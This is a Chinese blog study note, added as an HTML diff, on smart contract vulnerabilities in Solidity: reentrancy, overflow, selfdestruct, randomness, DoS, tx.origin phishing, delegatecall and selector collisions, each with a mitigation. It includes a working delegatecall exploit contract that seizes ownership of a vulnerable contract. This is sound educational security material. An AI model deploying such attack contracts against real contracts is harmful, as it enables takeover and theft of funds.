@@ -1,0 +1,703 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/BMlogo3.jpg">
+  <link rel="icon" href="/img/BMlogo3.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="BM-BoomMouse">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="重入攻击重入攻击是指攻击者通过在合约的回调函数中重新调用原合约，造成意外的行为或重入漏洞。重入攻击的一个攻击点就是合约转账ETH的地方：转账ETH的目标地址如果是合约，会触发对方合约的fallback（回退）函数，从而造成循环调用的可能。攻击流程大致为:  攻击者合约调用被攻击合约 被攻击合约向调用者转账(msg.sender.call{value:amount}(“”))，此时msg.sende">
+<meta property="og:type" content="article">
+<meta property="og:title" content="合约漏洞">
+<meta property="og:url" content="http://example.com/2024/05/14/%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="BM的小窝">
+<meta property="og:description" content="重入攻击重入攻击是指攻击者通过在合约的回调函数中重新调用原合约，造成意外的行为或重入漏洞。重入攻击的一个攻击点就是合约转账ETH的地方：转账ETH的目标地址如果是合约，会触发对方合约的fallback（回退）函数，从而造成循环调用的可能。攻击流程大致为:  攻击者合约调用被攻击合约 被攻击合约向调用者转账(msg.sender.call{value:amount}(“”))，此时msg.sende">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-14T03:32:37.000Z">
+<meta property="article:modified_time" content="2024-12-28T12:35:15.231Z">
+<meta property="article:author" content="BM-BoomMouse">
+<meta property="article:tag" content="区块链">
+<meta property="article:tag" content="solidity">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>合约漏洞 - BM的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BM的个人空间</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>主页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>类别</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/%E5%B0%8F%E7%8E%A9%E6%84%8F">
+                <i class="iconfont icon-pen"></i>
+                <span>小玩意</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner2.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="合约漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-14 11:32" pubdate>
+          May 14, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">合约漏洞</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on 21 hours ago
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h1><p>重入攻击是指攻击者通过在合约的回调函数中重新调用原合约，造成意外的行为或重入漏洞。<br>重入攻击的一个攻击点就是合约转账ETH的地方：转账ETH的目标地址如果是合约，会触发对方合约的<code>fallback（回退）</code>函数，从而造成循环调用的可能。<br>攻击流程大致为:</p>
+<ol>
+<li>攻击者合约调用被攻击合约</li>
+<li>被攻击合约向调用者转账(msg.sender.call{value:amount}(“”))，此时msg.sender为攻击者合约地址</li>
+<li>攻击者合约收到被攻击者合约的转账，触发fallback函数，再fallback中再次调用被攻击合约</li>
+<li>2,3步骤循环</li>
+</ol>
+<p>解决方案就是使用重入锁：在进行转账前修改状态变量，转账完成后，再修改回来。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bool internal locked;   // 定义状态变量表示重入锁<br><br>modifer noReentrant() &#123;<br>    require(!locked, &quot;重入攻击!&quot;);<br>    // 进行转账前<br>    locked = true;<br>    _; <br>    locked = false; <br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h1 id="溢出攻击"><a href="#溢出攻击" class="headerlink" title="溢出攻击"></a>溢出攻击</h1><p>每个数据类型都有它的取值范围，如果计算范围超出最大值或小于最小值，则会出现<strong>上溢</strong>和<strong>下溢</strong>。比如<code>uint8</code>的范围是[0,255]，如果用它计算0-1则会出现<strong>下溢</strong>，变为最大值255；如果用它计算255+1则会出现<strong>上溢</strong>，变为最小值0。</p>
+<p>溢出在0.8以下时不会报错，&gt;&#x3D;0.8溢出则会报错</p>
+<p>解决方案就是使用0.8及以上版本(0.8版本自带<code>SafeMath</code>库)，或者导入<code>SafeMath</code>库</p>
+<h1 id="自毁函数攻击"><a href="#自毁函数攻击" class="headerlink" title="自毁函数攻击"></a>自毁函数攻击</h1><p>自毁函数<code>selfdestruct</code>是solidity的一个特殊函数，它能将合约销毁，并将合约余额转给目标地址，攻击者可以利用它向其他合约<strong>强制转账</strong>，如果该合约的运行逻辑依赖于合约余额，强制转入可能会造成意外行为<br>比如一个合约有个函数，用来接收以太币并使用<code>address(this).balance()</code>对余额进行判断。攻击者合约通过<code>selfdestruct</code>绕过该函数强制转账，将不触发余额判断。</p>
+<p>解决方案就是不使用真实余额<code>address(this).balance</code>，而是定义一个状态变量<code>uint public balance;</code>，这样只有通过调用函数才会添加balance，<code>selfdestruct</code>强制发送不会计入</p>
+<h1 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h1><p>随机数的随机种子可以从区块变量中，也可以从预言机获取<br>常见的区块变量有：</p>
+<blockquote>
+<p>block.basefee(uint)：当前区块的基本费用</p>
+<p>block.chainid(uint)：当前链 id</p>
+<p>block.coinbase()：当前区块矿工地址 address payable</p>
+<p>block.difficulty(uint)：当前区块难度</p>
+<p>block.gaslimit(uint)：当前区块 gaslimit</p>
+<p>block.number(uint)：当前区块号</p>
+<p>block.timestamp(uint)：自 Unix 纪元以来的当前区块时间戳（以秒为单位）</p>
+<p>blockhash(uint blockNumber) returns (bytes32)：给定区块的哈希，仅适用于 256 个最近的区块</p>
+</blockquote>
+<p>区块变量可以限制普通用户对随机数的预测，但不能阻止矿工，矿工在打包交易时可以选取自己想要的进行打包，从而影响随机数。</p>
+<p>预言机是专门用于产生随机数的服务，预言机不仅能使用链上数据做随机种子，还能从链下的现实世界获取数据。</p>
+<h1 id="拒绝服务攻击DOS"><a href="#拒绝服务攻击DOS" class="headerlink" title="拒绝服务攻击DOS"></a>拒绝服务攻击DOS</h1><p>通过某些手段，对服务进行干涉，使得目标可用性降低或失去可用性而拒绝服务，称为拒绝服务攻击。</p>
+<p>拒绝服务攻击包括但不限于以下：</p>
+<ol>
+<li><p>基于代码逻辑的攻击：<br> 这种一般是由于合约不严谨导致的，比如：当合约未对传入的映射或数组做限制时，攻击者可以通过输入超长映射或数组 消耗大量的Gas，使得这笔交易的Gas溢出，最后使该合约暂时或永久不可用</p>
+</li>
+<li><p>基于外部调用的攻击：<br> 一般是合约对外部调用处理不严谨导致的</p>
+</li>
+<li><p>基于运营管理的攻击：<br> 比如合约的管理者被盗号</p>
+</li>
+</ol>
+<p>其中最常用的就是基于外部调用的攻击，例如：<br>有个合约A用于竞选最富有的人，其定义了一个函数用于接收以太币，然后将接收的以太币与当前最富有者发送的以太币对比，如果产生了新富豪，则将上一个富豪发送的以太币用<code>address.call&#123;value:account&#125;()</code>原路返回，如果返还以太币失败则会使用<code>require</code>退出。<br>这个合约的攻击点在于返回以太币与接收以太币都在同一个函数中，现在有一个攻击合约B，B中只有一个函数，接收以太币并调用A的竞选函数。<br>当B成为富豪后，其他人想竞选将会失败，这是因为B合约中没有<code>payable</code>修饰的<code>fallback</code>函数，使得B无法接收<code>B.call&#123;value: account&#125;()</code>这样的空调用转账，所以A对B的转账会一直失败，使得B成为了永久的富豪。</p>
+<p>解决方案：<br>定义新函数单独处理退款，用<strong>取回模式代替发送模式</strong>，这样就算有人恶意拒收也只能影响到自己。</p>
+<h1 id="tx-origin钓鱼攻击"><a href="#tx-origin钓鱼攻击" class="headerlink" title="tx.origin钓鱼攻击"></a>tx.origin钓鱼攻击</h1><p><code>tx.origin</code>和<code>msg.sender</code>类似，都是用于获取发送者地址，但<code>msg.sender</code>获取的是上层调用者的地址，<code>tx.origin</code>获取的是启动交易的原始地址<br>假设一个合约定义了状态状态变量<code>owner</code>用于存储合约部署者，在之后的函数中使用<code>reuqire(owern == tx.origin)</code>进行判断<br>由于使用的是<code>tx.origin</code>，那么攻击者可以通过伪造一个钓鱼合约，诱导被攻击者去调用，然后再在合约中调用被攻击者的合约，这样<code>tx.origin</code>就指向了被攻击者，成功越权。</p>
+<p>解决方案：<br><code>tx.origin</code> 目前仅适用于校验 <code>msg.sender </code>是否是 EOA 地址(账户地址)，不适用于做权限的校验，需要使用<code>msg.sender</code>来进行权限校验。</p>
+<h1 id="移花接木"><a href="#移花接木" class="headerlink" title="移花接木"></a>移花接木</h1><p>用户以为的调用路径：</p>
+<p>部署合约 A 传入合约 B 地址，这样调用路径为正常路径。</p>
+<p>实际的调用路径：</p>
+<p>部署合约 A 传入合约 C 地址，这样调用路径为非正常路径。</p>
+<p>B为开源的正常合约，C为恶意合约，黑客宣传B合约能赚钱，并把C合约的地址当做B合约让用户调用，用户只检查了B合约认为没问题便落入了陷阱</p>
+<h1 id="delegatecall调用"><a href="#delegatecall调用" class="headerlink" title="delegatecall调用"></a>delegatecall调用</h1><p>低级调用有：<code>call</code>,<code>delegatecall</code>,<code>callcode</code>，三种都用于调用外部合约或函数，但又有点不同</p>
+<ul>
+<li><p>call:<br><code>msg</code>指向的是调用者合约，<code>this</code>指向被调用合约，执行环境为被调用者合约的运行环境，合约之间状态变量互相独立不影响。<br>比如A调用了B，则<code>msg</code>指向了A，而<code>this</code>仍为B，B的代码交给B自己执行</p>
+</li>
+<li><p>delegatecall：<br><code>msg</code>指向的是调用者（不是调用者合约，而是调用者本人），<code>this</code>指向调用合约，执行环境为调用者合约的运行环境，合约之间的状态变量会根据声明顺序一一对应，会影响调用者状态变量的值。<br>比如caller部署了A，并用A调用了B，则<code>msg</code>指向的是caller，<code>this</code>指向的是A。假设A按以下顺序定义了<code>int a1; int a2</code>，而B按以下顺序定义了<code>int b1; int b2;</code>，同时在调用B的过程中，修改了<code>b1 = 1; b2 = 2</code>，则运行结束后，A中的<code>a1 == 1; a2 == 2</code>。<br>相当于将B的代码交给A执行</p>
+</li>
+<li><p>callcode：<br>在0.5.0以后被禁用，相当于上面二者的结合，<code>msg</code>指向调用者合约，<code>this</code>指向调用者合约，运行环境为调用者合约的运行环境</p>
+</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Lib &#123;<br>    uint public someNumber;<br><br><br>    function doSomething(uint _num) public &#123;<br>        someNumber = _num;<br>    &#125;<br>&#125;<br><br><br>contract HackMe &#123;<br>    address public lib;<br>    address public owner;<br>    uint public someNumber;<br><br><br>    constructor(address _lib) &#123;<br>        lib = _lib;<br>        owner = msg.sender;<br>    &#125;<br><br><br>    function doSomething(uint _num) public &#123;<br>        lib.delegatecall(abi.encodeWithSignature(&quot;doSomething(uint256)&quot;, _num));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.13;<br><br><br>contract Attack &#123;<br>    // Make sure the storage layout is the same as HackMe<br>    // This will allow us to correctly update the state variables<br>    address public lib;<br>    address public owner;<br>    uint public someNumber;<br><br><br>    HackMe public hackMe;<br><br><br>    constructor(HackMe _hackMe) &#123;<br>        hackMe = HackMe(_hackMe);<br>    &#125;<br><br><br>    function attack() public &#123;<br>        // override address of lib<br>        hackMe.doSomething(uint(uint160(address(this))));<br>        // pass any number as input, the function doSomething() below will<br>        // be called<br>        hackMe.doSomething(1);<br>    &#125;<br><br><br>    // function signature must match HackMe.doSomething()<br>    function doSomething(uint _num) public &#123;<br>        owner = msg.sender;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>攻击流程：</p>
+<ol>
+<li>攻击合约调用<code>hackMe.doSomething</code>并传入自己的地址</li>
+<li><code>hackMe.doSomething</code>通过<code>delegatecall</code>调用<code>lib.doSomething</code></li>
+<li>由于<code>delegatecall</code>的特性，lib中<code>someNumber</code>状态变量的修改会同步到hackMe中的<code>lib</code>状态变量，lib指向了攻击合约</li>
+<li>攻击合约继续调用<code>hackMe.doSomething</code>，由于<code>hackMe.lib</code>被修改，故<code>hackMe.doSomething</code>将会调用攻击合约中的<code>doSomething</code>，将owner修改为攻击者</li>
+</ol>
+<p>解决方案：</p>
+<ol>
+<li>在使用 delegatecall 时应注意被调用合约的地址不能是可控的</li>
+<li>在较为复杂的合约环境下需要注意变量的声明顺序以及存储位置。因为使用 delegatecall 进行外部调用时会根据被调用合约的数据结构来修改本合约相应 slot 中存储的数据</li>
+</ol>
+<h1 id="选择器碰撞"><a href="#选择器碰撞" class="headerlink" title="选择器碰撞"></a>选择器碰撞</h1><p>solidity在调用函数时，会通过函数选择器找到对应函数，函数选择器就是函数签名哈希值的前4个字节<br>函数签名是一个字符串，包含了函数名和参数类型形如<code>&quot;functionName(uint256)&quot;</code>，选择器就是<code>bytes4(keccak256(bytes(&quot;functionName(type1,type2)&quot;)))</code><br>选择器碰撞是指两个不同的函数具有相同的选择器，比如<code>LOCK8605463013()</code>和<code>uWjK9(uint256)</code>，他们的选择器都是<code>0xffffffff</code><br>选择器碰撞可以通过这个网址查询<a target="_blank" rel="noopener" href="https://www.4byte.directory/">“Ethereum Signature Database”</a></p>
+<p>参考资料：<br><a target="_blank" rel="noopener" href="https://learnblockchain.cn/people/420">“登链-慢雾科技”</a> 智能合约安全审计入门篇 各大篇</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">#区块链</a>
+      
+        <a href="/tags/solidity/">#solidity</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/19/django%E7%AC%94%E8%AE%B0/" title="Python Django后端学习笔记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Python Django后端学习笔记</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/28/js%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAWebSocket%E5%89%8D%E5%90%8E%E7%AB%AF%E5%8F%8A%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80/" title="js快速搭建WebSocket前后端及语法基础">
+                        <span class="hidden-mobile">js快速搭建WebSocket前后端及语法基础</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><p>
+
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
